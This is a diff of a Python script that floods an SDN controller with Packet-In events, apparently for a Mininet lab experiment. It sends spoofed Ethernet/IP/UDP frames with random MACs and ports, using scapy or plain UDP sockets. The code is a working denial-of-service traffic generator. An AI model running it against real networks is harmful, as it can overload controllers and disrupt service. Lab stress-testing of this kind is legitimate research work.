@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 """
-Packet-In saturation generator.
+Packet-In stress generator.
 
 Methods:
-1. scapy: sends raw Ethernet frames with random destination MACs.
-   Best for SDN Packet-In saturation because it bypasses ARP.
+1. scapy: sends raw Ethernet/IP/UDP frames with random destination MACs.
+   This is the best method for Packet-In saturation because each packet is
+   likely to miss the switch table and reach the SDN controller.
 
 2. udp: fallback standard-library UDP sender.
-   Not recommended for final testing because ARP can limit traffic.
+   This is less reliable for Packet-In saturation because ARP and learned
+   switch flows can reduce controller involvement.
 """
 
 import argparse
@@ -27,9 +29,22 @@ def random_mac():
     )
 
 
+def random_ip(prefix="10.0.0.", start=50, end=250):
+    return f"{prefix}{random.randint(start, end)}"
+
+
+def write_log(path, rows):
+    if not path:
+        return
+    with open(path, "w", newline="") as f:
+        writer = csv.writer(f)
+        writer.writerow(["timestamp", "total_packets_sent"])
+        writer.writerows(rows)
+
+
 def run_scapy(args):
     try:
-        from scapy.all import Ether, Raw, sendpfast, get_if_hwaddr
+        from scapy.all import Ether, IP, UDP, Raw, get_if_hwaddr, sendp
     except ImportError:
         raise SystemExit(
             "Scapy is not installed. Install with: sudo apt-get install python3-scapy"
@@ -37,7 +52,6 @@ def run_scapy(args):
 
     src_mac = get_if_hwaddr(args.iface)
     payload = b"A" * max(1, args.size)
-
     delay = 0 if args.rate <= 0 else 1.0 / args.rate
     end_time = time.time() + args.duration
 
@@ -46,13 +60,14 @@ def run_scapy(args):
     last_log = time.time()
 
     while time.time() < end_time:
-        dst_mac = random_mac()
+        pkt = (
+            Ether(src=src_mac, dst=random_mac()) /
+            IP(src=random_ip(args.target_prefix, args.start_host, args.end_host), dst=args.target or random_ip(args.target_prefix, args.start_host, args.end_host)) /
+            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
+            Raw(payload)
+        )
 
-        # Random destination MAC means OVS will not have a learned flow for it.
-        # This should hit the table-miss rule and trigger Packet-In.
-        pkt = Ether(src=src_mac, dst=dst_mac, type=0x0800) / Raw(payload)
-
-        sendpfast(pkt, iface=args.iface, verbose=False)
+        sendp(pkt, iface=args.iface, verbose=False)
         sent += 1
 
         now = time.time()
@@ -70,7 +85,6 @@ def run_scapy(args):
 def run_udp(args):
     payload = b"A" * max(1, args.size)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
     delay = 0 if args.rate <= 0 else 1.0 / args.rate
     end_time = time.time() + args.duration
 
@@ -79,13 +93,8 @@ def run_udp(args):
     last_log = time.time()
 
     while time.time() < end_time:
-        if args.target:
-            dst = args.target
-        else:
-            dst = f"{args.target_prefix}{random.randint(args.start_host, args.end_host)}"
-
+        dst = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
         port = random.randint(1024, 65535)
-
         try:
             sock.sendto(payload, (dst, port))
             sent += 1
@@ -105,42 +114,23 @@ def run_udp(args):
     print(f"packetin_attack method=udp sent_packets={sent}", flush=True)
 
 
-def write_log(path, rows):
-    if not path:
-        return
-
-    with open(path, "w", newline="") as f:
-        writer = csv.writer(f)
-        writer.writerow(["timestamp", "total_packets_sent"])
-        writer.writerows(rows)
-
-
 def parse_args():
     parser = argparse.ArgumentParser()
-
     parser.add_argument("--method", choices=["scapy", "udp"], default="scapy")
-
-    # Used by scapy mode.
     parser.add_argument("--iface", default="h2-eth0", help="Interface to send raw frames from")
-
-    # Used by UDP mode.
     parser.add_argument("--target", default=None)
     parser.add_argument("--target-prefix", default="10.0.0.")
     parser.add_argument("--start-host", type=int, default=50)
     parser.add_argument("--end-host", type=int, default=250)
-
-    # Shared.
     parser.add_argument("--rate", type=float, default=1200)
     parser.add_argument("--size", type=int, default=64)
     parser.add_argument("--duration", type=float, default=60)
     parser.add_argument("--log", default="attack_sent.csv")
-
     return parser.parse_args()
 
 
 def main():
     args = parse_args()
-
     if args.method == "scapy":
         run_scapy(args)
     else:
